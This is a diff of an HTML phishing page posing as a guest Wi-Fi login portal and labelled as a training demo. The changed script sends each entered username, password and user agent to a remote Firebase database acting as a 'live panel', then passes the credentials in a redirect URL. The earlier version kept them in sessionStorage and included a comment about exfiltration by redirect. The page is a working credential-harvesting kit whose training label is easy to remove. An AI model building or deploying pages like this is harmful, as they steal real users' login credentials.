@@ -1,16 +1,15 @@
 <!doctype html>
-<html lang=\"en\">
+<html lang="en">
 <head>
-  <meta charset=\"utf-8\" />
-  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
-  <title>Wi‑Fi Access Portal</title>
-  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">
-  <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap\" rel=\"stylesheet\">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Guest Wi‑Fi Portal (Training Demo)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     :root { --bg:#0b1220; --card:#121a2b; --accent:#59d185; --text:#e7eef8; --muted:#9ab0cf; }
     *{box-sizing:border-box}
     body{margin:0; font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; background:linear-gradient(160deg,#0b1220 0%, #10172a 50%, #0b1220 100%); color:var(--text); min-height:100vh; display:grid; place-items:center;}
-    .card{width:min(440px,92vw); background:var(--card); border:1px solid rgba(255,255,255,.06); border-radius:20px; padding:28px; box-shadow:0 12px 40px rgba(0,0,0,.35)}
+    .card{width:min(460px,92vw); background:var(--card); border:1px solid rgba(255,255,255,.06); border-radius:20px; padding:28px; box-shadow:0 12px 40px rgba(0,0,0,.35)}
     h1{font-size:1.25rem; margin:0 0 6px 0}
     p.sub{margin:0 0 22px 0; color:var(--muted); font-size:.95rem}
     label{display:block; font-weight:600; margin:14px 0 8px 0}
@@ -20,46 +19,60 @@
     button{background:var(--accent); border:0; color:#0b1220; font-weight:700; padding:12px 16px; border-radius:12px; cursor:pointer}
     .fineprint{margin-top:14px; color:var(--muted); font-size:.8rem}
     .badge{display:inline-flex; align-items:center; gap:8px; background:#0e1524; border:1px dashed rgba(255,255,255,.12); color:var(--muted); padding:8px 10px; border-radius:12px; font-size:.82rem}
+    .notice{margin-top:10px; font-size:.85rem; color:#9ab0cf}
   </style>
 </head>
 <body>
-  <main class=\"card\">
-    <div class=\"badge\">🔗 Guest Wi‑Fi • Wichita Office</div>
+  <main class="card">
+    <div class="badge">🔗 Guest Wi‑Fi • Training Simulation</div>
     <h1>Connect to Guest Wi‑Fi</h1>
-    <p class=\"sub\">Enter your portal username and password to get online.</p>
+    <p class="sub">Enter your portal username and password to get online.</p>
 
-    <form id=\"loginForm\" autocomplete=\"off\">
-      <label for=\"username\">Username</label>
-      <input id=\"username\" name=\"username\" required placeholder=\"e.g. jsmith\" />
+    <form id="loginForm" autocomplete="off">
+      <label for="username">Username</label>
+      <input id="username" name="username" required placeholder="e.g. jsmith" />
 
-      <label for=\"password\">Password</label>
-      <input id=\"password\" name=\"password\" type=\"password\" required placeholder=\"••••••••\" />
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" required placeholder="••••••••" />
 
-      <div class=\"actions\">
+      <div class="actions">
         <div></div>
-        <button type=\"submit\">Get Online</button>
+        <button type="submit">Get Online</button>
       </div>
-      <p class=\"fineprint\">By continuing you agree to the Acceptable Use Policy.</p>
+      <p class="fineprint">By continuing you agree to the Acceptable Use Policy.</p>
+      <p class="notice">Training note: Use <strong>fake</strong> credentials only. This demo records inputs to a training dashboard.</p>
     </form>
   </main>
 
+  <!-- Firebase (compat builds for simple scripts) -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+  <script src="firebase-config.js"></script>
   <script>
-    // Demo-only: prevent real credentials
-    document.getElementById('loginForm').addEventListener('submit', function(e){
+    // Initialize Firebase
+    const app = firebase.initializeApp(window.FIREBASE_CONFIG);
+    const db = firebase.database();
+    const sessionId = window.SESSION_ID || 'demo-session-1';
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const u = document.getElementById('username').value.trim();
       const p = document.getElementById('password').value.trim();
+      const entry = {
+        username: u || '(blank)',
+        password: p || '(blank)',
+        ua: navigator.userAgent,
+        ts: Date.now()
+      };
 
-      // Store to sessionStorage (simulates a capture step)
-      sessionStorage.setItem('captured_username', u);
-      sessionStorage.setItem('captured_password', p);
-      sessionStorage.setItem('captured_time', new Date().toISOString());
-      sessionStorage.setItem('captured_ua', navigator.userAgent);
-      sessionStorage.setItem('captured_ref', location.href);
+      try {
+        await db.ref(`sessions/${sessionId}/entries`).push(entry);
+      } catch (err) {
+        console.error('Failed to submit to live panel:', err);
+      }
 
-      // Also encode into URL params to illustrate exfil via redirect
+      // Redirect to the reveal page (local, not stored anywhere else)
       const qp = new URLSearchParams({ u, p }).toString();
-      // NOTE: In real attacks, this redirect could be silent.
       location.href = 'reveal.html?' + qp;
     });
   </script>
